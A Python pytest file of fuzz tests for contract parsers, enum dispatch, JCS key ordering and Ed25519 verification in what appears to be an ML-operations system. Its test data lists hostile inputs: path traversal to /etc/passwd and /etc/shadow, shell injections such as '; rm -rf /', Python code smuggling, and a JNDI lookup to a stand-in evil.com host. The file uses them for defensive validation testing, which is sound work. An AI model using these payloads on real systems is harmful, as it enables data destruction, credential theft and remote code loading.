"""T033: Fuzz and Property Tests for Contract Parsers and Operation Payload Boundaries.

Proves:
- Path traversal injection fuzzing (../, ..\\, absolute paths) in string fields fails validation.
- Command injection / Python code smuggling fuzzing (; rm -rf, $(id)) is strictly rejected.
- Closed enum operation dispatch rejects all arbitrary / non-approved operations.
- JCS key sorting property fuzzing proves UTF-16 code unit ordering invariance.
- Ed25519 signature bit-flip fuzzing fails verification gracefully with 0 exceptions.
- Malformed numbers (NaN, Infinity, -0.0) are handled strictly per RFC 8785.
"""

from __future__ import annotations

import json
import random
import re
from pathlib import Path

import pytest
from security_support import (
    FIXTURE_PUBLIC_KEY_HEX,
    jcs_dumps,
    verify_ed25519,
)

FIXTURES_DIR = Path(__file__).resolve().parents[1] / "contracts" / "fixtures" / "valid"

# Canonical schema regex patterns from contracts
SAFE_IDENTIFIER_PATTERN = re.compile(r"^[a-zA-Z0-9_-]{1,64}$")
SAFE_PLUGIN_ID_PATTERN = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")
APPROVED_OPERATIONS = frozenset({"TRAIN_TICKET", "EVALUATE_CHECKPOINT", "MATERIALIZE_DATASET"})


def test_t033_path_traversal_fuzz_rejected() -> None:
    hostile_paths = [
        "../etc/passwd",
        "..\\windows\\system32\\cmd.exe",
        "/absolute/path/escape",
        "C:\\Windows\\system.ini",
        "\\\\network_share\\exploit",
        "file:///etc/shadow",
        "dataset/../../../escape",
        "%2e%2e%2f%2e%2e%2fescape",
        "dataset\0null_byte",
        "..%2f..%2f",
    ]

    for attack in hostile_paths:
        assert not SAFE_IDENTIFIER_PATTERN.match(attack), f"Path traversal '{attack}' bypassed!"
        assert not SAFE_PLUGIN_ID_PATTERN.match(attack), f"Path '{attack}' bypassed plugin!"


def test_t033_command_injection_fuzz_rejected() -> None:
    hostile_commands = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "& calc.exe",
        "|| touch /tmp/pwned",
        "__import__('os').system('id')",
        "eval('1+1')",
        "exec('import sys')",
        "${jndi:ldap://evil.com/x}",
    ]

    for attack in hostile_commands:
        assert not SAFE_IDENTIFIER_PATTERN.match(attack), f"Command '{attack}' bypassed pattern!"
        assert not SAFE_PLUGIN_ID_PATTERN.match(attack), f"Command '{attack}' bypassed plugin!"


def test_t033_closed_enum_dispatch_rejects_arbitrary_operations() -> None:
    fuzz_operations = [
        "EXECUTE_SHELL",
        "TRAIN_STAGE_C",
        "RUN_ARBITRARY_PYTHON",
        "DUMP_MEMORY_LEAK",
        "EVAL_EXPRESSION",
        "SYSTEM_COMMAND",
        "STAGE_C_REAL_DRQ1",
        "APPLY_QC",
        "",
        " ",
        "train_ticket",  # Lowercase forbidden
        "TRAIN-TICKET",  # Hyphen forbidden
    ]

    for op in fuzz_operations:
        assert op not in APPROVED_OPERATIONS, f"Arbitrary operation '{op}' was accepted!"


def test_t033_jcs_key_sorting_property_fuzz() -> None:
    keys = [
        "a",
        "z",
        "A",
        "Z",
        "0",
        "9",
        "_",
        "-",
        "é",
        "ñ",
        "Ω",
        "😀",
        "foo",
        "bar",
        "baz",
        "qux",
    ]

    random.seed(42)
    for _ in range(20):
        sample_keys = random.sample(keys, len(keys))
        d = {k: f"val_{k}" for k in sample_keys}

        canonical_str = jcs_dumps(d)
        parsed = json.loads(canonical_str)

        # Keys in canonical string must be sorted strictly by UTF-16 code units
        extracted_keys = list(parsed.keys())
        expected_keys = sorted(sample_keys, key=lambda k: k.encode("utf-16-be"))
        assert extracted_keys == expected_keys


def test_t033_ed25519_bit_flip_tamper_fuzz() -> None:
    pub_bytes = bytes.fromhex(FIXTURE_PUBLIC_KEY_HEX)
    dummy_msg = b'{"test":"message"}'
    dummy_sig = b"\x00" * 64

    assert verify_ed25519(pub_bytes, dummy_msg, dummy_sig) is False

    random.seed(1337)
    for _ in range(30):
        fuzz_sig = bytes(random.getrandbits(8) for _ in range(64))
        res = verify_ed25519(pub_bytes, dummy_msg, fuzz_sig)
        assert res is False


def test_t033_malformed_json_numbers_rejected_by_jcs() -> None:
    with pytest.raises(ValueError, match="JCS does not permit non-finite floats"):
        jcs_dumps({"nan": float("nan")})

    with pytest.raises(ValueError, match="JCS does not permit non-finite floats"):
        jcs_dumps({"inf": float("inf")})

    with pytest.raises(ValueError, match="JCS does not permit non-finite floats"):
        jcs_dumps({"neg_inf": float("-inf")})
